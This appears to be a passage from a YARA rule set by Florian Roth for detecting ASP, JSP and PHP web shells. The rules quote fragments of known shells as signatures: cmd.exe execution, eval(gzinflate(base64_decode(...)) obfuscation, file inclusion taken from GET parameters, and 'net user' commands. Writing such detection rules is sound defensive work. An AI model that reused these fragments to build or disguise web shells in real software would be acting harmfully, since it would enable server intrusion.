Webshell_asp_cmdasp_RID2EC1 : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Web Shell - file cmdasp.asp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 11:28:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"<%= \\\"\\\\\\\\\\\" & oScriptNet.ComputerName & \\\"\\\\\\\" & oScriptNet.UserName %>\" fullword\n      $s7 = \"Call oScript.Run (\\\"cmd.exe /c \\\" & szCMD & \\\" > \\\" & szTempFile, 0, True)\" fullword\n   condition: \n      all of them\n}\n\nrule Webshell_spjspshell_RID2EEE : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Web Shell - file spjspshell.jsp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 11:35:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s7 = \"Unix:/bin/sh -c tar vxf xxx.tar Windows:c:\\\\winnt\\\\system32\\\\cmd.exe /c type c:\" \n   condition: \n      all of them\n}\n\nrule Webshell_jsp_action_RID2ED0 : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Web Shell - file action.jsp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 11:30:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"String url=\\\"jdbc:oracle:thin:@localhost:1521:orcl\\\";\" fullword\n      $s6 = \"<%@ page contentType=\\\"text/html;charset=gb2312\\\"%>\" fullword\n   condition: \n      all of them\n}\n\nrule Webshell_Inderxer_RID2DE7 : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Web Shell - file Inderxer.asp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 10:51:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s4 = \"<td>Nereye :<td><input type=\\\"text\\\" name=\\\"nereye\\\" size=25></td><td><input typ\" \n   condition: \n      all of them\n}\n\nrule Webshell_asp_Rader_RID2E37 : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Web Shell - file Rader.asp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 11:05:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"FONT-WEIGHT: bold; FONT-SIZE: 10px; BACKGROUND: none transparent scroll repeat 0\" \n      $s3 = \"m\\\" target=inf onClick=\\\"window.open('?action=help','inf','width=450,height=400 \" \n   condition: \n      all of them\n}\n\nrule Webshell_c99_madnet_smowu_RID30ED : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Web Shell - file smowu.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 13:00:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"//Authentication\" fullword\n      $s1 = \"$login = \\\"\" fullword\n      $s2 = \"eval(gzinflate(base64_decode('\" \n      $s4 = \"//Pass\" \n      $s5 = \"$md5_pass = \\\"\" \n      $s6 = \"//If no pass then hash\" \n   condition: \n      all of them\n}\n\nrule Webshell_php_moon_RID2E06 : DEMO SCRIPT T1087_002 T1505_003 WEBSHELL {\n   meta:\n      description = \"Web Shell - file moon.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 10:56:51\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SCRIPT, T1087_002, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s2 = \"echo '<option value=\\\"create function backshell returns string soname\" \n      $s3 = \"echo      \\\"<input name='p' type='text' size='27' value='\\\".dirname(_FILE_).\\\"\" \n      $s8 = \"echo '<option value=\\\"select cmdshell(\\\\'net user \" \n   condition: \n      2 of them\n}\n\nrule Webshell_minupload_RID2E6F : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Web Shell - file minupload.jsp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 11:14:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"<input type=\\\"submit\\\" name=\\\"btnSubmit\\\" value=\\\"Upload\\\">   \" fullword\n      $s9 = \"String path=new String(request.getParameter(\\\"path\\\").getBytes(\\\"ISO-8859\" \n   condition: \n      all of them\n}\n\nrule Webshell_ELMALISEKER_Backd00r_RID30DA : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Web Shell - file ELMALISEKER Backd00r.asp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 12:57:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"response.write(\\\"<tr><td bgcolor=#F8F8FF><input type=submit name=cmdtxtFileOptio\" \n      $s2 = \"if FP = \\\"RefreshFolder\\\" or request.form(\\\"cmdOption\\\")=\\\"DeleteFolder\\\" or req\" \n   condition: \n      all of them\n}\n\nrule Webshell_PHP_bug_1__RID2E1A : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Web Shell - file bug (1).php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 11:00:11\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"@include($_GET['bug']);\" fullword\n   condition: \n      all of them\n}\n\nrule Webshell_caidao_shell_hkmjj_RID31F1 : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Web Shell - file hkmjj.asp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 13:44:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s6 = \"codeds=\\\"Li#uhtxhvw+%{{%,#@%{%#wkhq#hydo#uhtxhvw+%knpmm%,#hqg#li\\\"  \" fullword\n   condition: \n      all of them\n}\n\nrule Webshell_jsp_asd_RID2D8A : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Web Shell - file asd.jsp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 10:36:11\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s3 = \"<%@ page language=\\\"java\\\" pageEncoding=\\\"gbk\\\"%>\" fullword\n      $s6 = \"<input size=\\\"100\\\" value=\\\"<%=application.getRealPath(\\\"/\\\") %>\\\" name=\\\"url\" \n   condition: \n      all of them\n}\n\nrule Webshell_metaslsoft_RID2EE8 : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Web Shell - file metaslsoft.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 11:34:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s7 = \"$buff .= \\\"<tr><td><a href=\\\\\\\"?d=\\\".$pwd.\\\"\\\\\\\">[ $folder ]</a></td><td>LINK</t\" \n   condition: \n      all of them\n}\n\nrule Webshell_asp_Ajan_RID2DC3 : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Web Shell - file Ajan.asp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 10:45:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s3 = \"entrika.write \\\"BinaryStream.SaveToFile \\\"\\\"c:\\\\downloaded.zip\\\"\\\", adSaveCreate\" \n   condition: \n      all of them\n}\n\nrule Webshell_config_myxx_zend_RID3161 : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Web Shell - from files config.jsp, myxx.jsp, zend.jsp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 13:20:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"e0354099bee243702eb11df8d0e046df\"\n      hash2 = \"591ca89a25f06cf01e4345f98a22845c\"\n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s3 = \".println(\\\"<a href=\\\\\\\"javascript:alert('You Are In File Now ! Can Not Pack !');\" \n   condition: \n      all of them\n}\n\nrule Webshell_browser_201_3_ma_download_RID3412 : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Web Shell - from files browser.jsp, 201.jsp, 3.jsp, ma.jsp, download.jsp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 15:14:51\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"a7e25b8ac605753ed0c438db93f6c498\"\n      hash2 = \"fb8c6c3a69b93e5e7193036fd31a958d\"\n      hash3 = \"4cc68fa572e88b669bce606c7ace0ae9\"\n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s2 = \"<small>jsp File Browser version <%= VERSION_NR%> by <a\" \n      $s3 = \"else if (fName.endsWith(\\\".mpg\\\") || fName.endsWith(\\\".mpeg\\\") || fName.endsWith\" \n   condition: \n      all of them\n}\n\nrule Webshell_itsec_itsecteam_shell_jHn_RID34D2 : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Web Shell - from files itsec.php, itsecteam_shell.php, jHn.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 15:46:51\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"bd6d3b2763c705a01cc2b3f105a25fa4\"\n      hash2 = \"40c6ecf77253e805ace85f119fe1cebb\"\n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s4 = \"echo $head.\\\"<font face='Tahoma' size='2'>Operating System : \\\".php_uname().\\\"<b\" \n      $s5 = \"echo \\\"<center><form name=client method='POST' action='$_SERVER[PHP_SELF]?do=db'\" \n   condition: \n      all of them\n}\n\nrule Webshell_Ghost_Icesword_Silic_RID329D : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Web Shell - from files ghost_source.php, icesword.php, silic.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 14:12:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"6e20b41c040efb453d57780025a292ae\"\n      hash2 = \"437d30c94f8eef92dc2f064de4998695\"\n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s3 = \"if(eregi('WHERE|LIMIT',$_POST['nsql']) && eregi('SELECT|FROM',$_POST['nsql'])) $\" \n      $s6 = \"if(!empty($_FILES['ufp']['name'])){if($_POST['ufn'] != '') $upfilename = $_POST[\" \n   condition: \n      all of them\n}\n\nrule Webshell_JspSpy_JspSpyJDK5_JspSpyJDK51_luci_jsp_spy2009_m_ma3_xxx_RID3F1D : DEMO SCRIPT T1012 T1505_003 T1543_003 WEBSHELL {\n   meta:\n      description = \"Detects Web Shell from tennc webshell repo\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 23:06:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"059058a27a7b0059e2c2f007ad4675ef\"\n      hash2 = \"ae76c77fb7a234380cd0ebb6fe1bcddf\"\n      hash3 = \"76037ebd781ad0eac363d56fc81f4b4f\"\n      tags = \"DEMO, SCRIPT, T1012, T1505_003, T1543_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s8 = \"\\\"<form action=\\\\\\\"\\\"+SHELL_NAME+\\\"?o=upload\\\\\\\" method=\\\\\\\"POST\\\\\\\" enctype=\" \n      $s9 = \"<option value='reg query \\\\\\\"HKLM\\\\\\\\System\\\\\\\\CurrentControlSet\\\\\\\\Control\\\\\\\\T\" \n   condition: \n      all of them\n}\n\nrule Webshell_2_520_job_ma1_ma4_2_RID30B8 : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Web Shell - from files 2.jsp, 520.jsp, job.jsp, ma1.jsp, ma4.jsp, 2.jsp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 12:51:51\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"9abd397c6498c41967b4dd327cf8b55a\"\n      hash2 = \"56c005690da2558690c4aa305a31ad37\"\n      hash3 = \"532b93e02cddfbb548ce5938fe2f5559\"\n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s4 = \"_url = \\\"jdbc:microsoft:sqlserver://\\\" + dbServer + \\\":\\\" + dbPort + \\\";User=\\\" \" \n      $s9 = \"result += \\\"<meta http-equiv=\\\\\\\"refresh\\\\\\\" content=\\\\\\\"2;url=\\\" + request.getR\" \n   condition: \n      all of them\n}\n\nrule Webshell_JspSpyJDK51_luci_jsp_xxx_RID33CD : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Detects Web Shell from tennc webshell repo\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 15:03:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"059058a27a7b0059e2c2f007ad4675ef\"\n      hash2 = \"ae76c77fb7a234380cd0ebb6fe1bcddf\"\n      hash3 = \"76037ebd781ad0eac363d56fc81f4b4f\"\n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"ports = \\\"21,25,80,110,1433,1723,3306,3389,4899,5631,43958,65500\\\";\" fullword\n      $s1 = \"private static class VEditPropertyInvoker extends DefaultInvoker {\" fullword\n   condition: \n      all of them\n}\n\nrule Webshell_wso2_5_1_wso2_5_wso2_RID31BD : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Web Shell - from files wso2.5.1.php, wso2.5.php, wso2.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 13:35:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"7c8e5d31aad28eb1f0a9a53145551e05\"\n      hash2 = \"cbc44fb78220958f81b739b493024688\"\n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s7 = \"$opt_charsets .= '<option value=\\\"'.$item.'\\\" '.($_POST['charset']==$item?'selec\" \n      $s8 = \".'</td><td><a href=\\\"#\\\" onclick=\\\"g(\\\\'FilesTools\\\\',null,\\\\''.urlencode($f['na\" \n   condition: \n      all of them\n}\n\nrule Webshell_QueryDong_spyjsp2010_t00ls_RID3421 : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Web Shell - from files 000.jsp, 403.jsp, c5.jsp, queryDong.jsp, spyjsp2010.jsp, t00ls.jsp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 15:17:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"059058a27a7b0059e2c2f007ad4675ef\"\n      hash2 = \"8b457934da3821ba58b06a113e0d53d9\"\n      hash3 = \"90a5ba0c94199269ba33a58bc6a4ad99\"\n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s8 = \"table.append(\\\"<td nowrap> <a href=\\\\\\\"#\\\\\\\" onclick=\\\\\\\"view('\\\"+tbName+\\\"')\" \n      $s9 = \"\\\"<p><input type=\\\\\\\"hidden\\\\\\\" name=\\\\\\\"selectDb\\\\\\\" value=\\\\\\\"\\\"+selectDb+\\\"\" \n   condition: \n      all of them\n}\n\nrule Webshell_404_data_suiyue_RID303A : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Web Shell - from files 404.jsp, data.jsp, suiyue.jsp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 12:30:51\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"9f54aa7b43797be9bab7d094f238b4ff\"\n      hash2 = \"c93d5bdf5cf62fe22e299d0f2b865ea7\"\n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s3 = \" sbCopy.append(\\\"<input type=button name=goback value=' \\\"+strBack[languageNo]+\" \n   condition: \n      all of them\n}\n\nrule Webshell_r57shell_SnIpEr_EgY_SpIdEr_RID3416 : CRIME DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Detects Web Shell from tennc webshell repo\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 15:15:31\"\n      score = 90\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"ae025c886fbe7f9ed159f49593674832\"\n      hash2 = \"911195a9b7c010f61b66439d9048f400\"\n      hash3 = \"697dae78c040150daff7db751fc0c03c\"\n      tags = \"CRIME, DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s2 = \"echo sr(15,\\\"<b>\\\".$lang[$language.'_text58'].$arrow.\\\"</b>\\\",in('text','mk_name\" \n      $s3 = \"echo sr(15,\\\"<b>\\\".$lang[$language.'_text21'].$arrow.\\\"</b>\\\",in('checkbox','nf1\" \n      $s9 = \"echo sr(40,\\\"<b>\\\".$lang[$language.'_text26'].$arrow.\\\"</b>\\\",\\\"<select size=\" \n   condition: \n      all of them\n}\n\nrule Webshell_JspSpy_xxx_RID2ED6 : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Detects Web Shell from tennc webshell repo\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 11:31:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"76037ebd781ad0eac363d56fc81f4b4f\"\n      hash2 = \"fc44f6b4387a2cb50e1a63c66a8cb81c\"\n      hash3 = \"14e9688c86b454ed48171a9d4f48ace8\"\n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"\\\"<h2>Remote Control &raquo;</h2><input class=\\\\\\\"bt\\\\\\\" onclick=\\\\\\\"var\" \n      $s2 = \"\\\"<p>Current File (import new file name and new file)<br /><input class=\\\\\\\"inpu\" \n      $s3 = \"\\\"<p>Current file (fullpath)<br /><input class=\\\\\\\"input\\\\\\\" name=\\\\\\\"file\\\\\\\" i\" \n   condition: \n      all of them\n}\n\nrule Webshell_JSP_MA_download_RID3037 : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Web Shell - from files 201.jsp, 3.jsp, ma.jsp, download.jsp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 12:30:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"fb8c6c3a69b93e5e7193036fd31a958d\"\n      hash2 = \"4cc68fa572e88b669bce606c7ace0ae9\"\n      hash3 = \"fa87bbd7201021c1aefee6fcc5b8e25a\"\n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"<input title=\\\"Upload selected file to the current working directory\\\" type=\\\"Su\" \n      $s5 = \"<input title=\\\"Launch command in current directory\\\" type=\\\"Submit\\\" class=\\\"but\" \n      $s6 = \"<input title=\\\"Delete all selected files and directories incl. subdirs\\\" class=\" \n   condition: \n      all of them\n}\n\nrule Webshell_JFolder_Leo_RID2ECB : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Detects Web Shell from tennc webshell repo\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 11:29:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"a7e25b8ac605753ed0c438db93f6c498\"\n      hash2 = \"fb8c6c3a69b93e5e7193036fd31a958d\"\n      hash3 = \"36331f2c81bad763528d0ae00edf55be\"\n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s4 = \"UplInfo info = UploadMonitor.getInfo(fi.clientFileName);\" fullword\n      $s5 = \"long time = (System.currentTimeMillis() - starttime) / 1000l;\" fullword\n   condition: \n      all of them\n}\n\nrule Webshell_shell_phpspy_2006_arabicspy_RID3505 : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Web Shell - from files shell.php, phpspy_2006.php, arabicspy.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 15:55:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"40a1f840111996ff7200d18968e42cfe\"\n      hash2 = \"e0202adff532b28ef1ba206cf95962f2\"\n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"elseif(($regwrite) AND !empty($_POST['writeregname']) AND !empty($_POST['regtype\" \n      $s8 = \"echo \\\"<form action=\\\\\\\"?action=shell&dir=\\\".urlencode($dir).\\\"\\\\\\\" method=\\\\\\\"P\" \n   condition: \n      all of them\n}\n\nrule Webshell_in_JFolder_jfolder01_jsp_leo_warn_RID378A : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Web Shell - from files in.jsp, JFolder.jsp, jfolder01.jsp, jsp.jsp, leo.jsp, warn.jsp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 17:42:51\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"8979594423b68489024447474d113894\"\n      hash2 = \"ec482fc969d182e5440521c913bab9bd\"\n      hash3 = \"f98d2b33cd777e160d1489afed96de39\"\n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s4 = \"sbFile.append(\\\"  &nbsp;<a href=\\\\\\\"javascript:doForm('down','\\\"+formatPath(strD\" \n      $s9 = \"sbFile.append(\\\" &nbsp;<a href=\\\\\\\"javascript:doForm('edit','\\\"+formatPath(strDi\" \n   condition: \n      all of them\n}\n\nrule Webshell_2_520_icesword_job_ma1_ma4_2_RID3477 : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Web Shell - from files 2.jsp, 520.jsp, icesword.jsp, job.jsp, ma1.jsp, ma4.jsp, 2.jsp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 15:31:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"9abd397c6498c41967b4dd327cf8b55a\"\n      hash2 = \"077f4b1b6d705d223b6d644a4f3eebae\"\n      hash3 = \"56c005690da2558690c4aa305a31ad37\"\n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s2 = \"private String[] _textFileTypes = {\\\"txt\\\", \\\"htm\\\", \\\"html\\\", \\\"asp\\\", \\\"jsp\\\",\" \n      $s3 = \"\\\\\\\" name=\\\\\\\"upFile\\\\\\\" size=\\\\\\\"8\\\\\\\" class=\\\\\\\"textbox\\\\\\\" />&nbsp;<input typ\" \n      $s9 = \"if (request.getParameter(\\\"password\\\") == null && session.getAttribute(\\\"passwor\" \n   condition: \n      all of them\n}\n\nrule Webshell_lite_PHPSPY_RID2E97 : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Web Shell - from files phpspy_2005_full.php, phpspy_2005_lite.php, PHPSPY.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 11:21:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"42f211cec8032eb0881e87ebdb3d7224\"\n      hash2 = \"0712e3dc262b4e1f98ed25760b206836\"\n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s6 = \"<input type=\\\"text\\\" name=\\\"command\\\" size=\\\"60\\\" value=\\\"<?=$_POST['comma\" \n      $s7 = \"echo $msg=@copy($_FILES['uploadmyfile']['tmp_name'],\\\"\\\".$uploaddir.\\\"/\\\".$_FILE\" \n      $s8 = \"<option value=\\\"passthru\\\" <? if ($execfunc==\\\"passthru\\\") { echo \\\"selected\\\"; \" \n   condition: \n      2 of them\n}\n\nrule Webshell_phpspy_arabicspy_RID3167 : DEMO SCRIPT T1007 T1505_003 WEBSHELL {\n   meta:\n      description = \"Web Shell - from files shell.php, phpspy_2006.php, arabicspy.php, hkrkoz.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 13:21:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"40a1f840111996ff7200d18968e42cfe\"\n      hash2 = \"e0202adff532b28ef1ba206cf95962f2\"\n      hash3 = \"802f5cae46d394b297482fd0c27cb2fc\"\n      tags = \"DEMO, SCRIPT, T1007, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s5 = \"$prog = isset($_POST['prog']) ? $_POST['prog'] : \\\"/c net start > \\\".$pathname.\" \n   condition: \n      all of them\n}\n\nrule Webshell_C99_Shell_ci_Biz_RID3061 : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Detects Web Shell from tennc webshell repo\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 12:37:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"f2fa878de03732fbf5c86d656467ff50\"\n      hash2 = \"27786d1e0b1046a1a7f67ee41c64bf4c\"\n      hash3 = \"0f5b9238d281bc6ac13406bb24ac2a5b\"\n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = 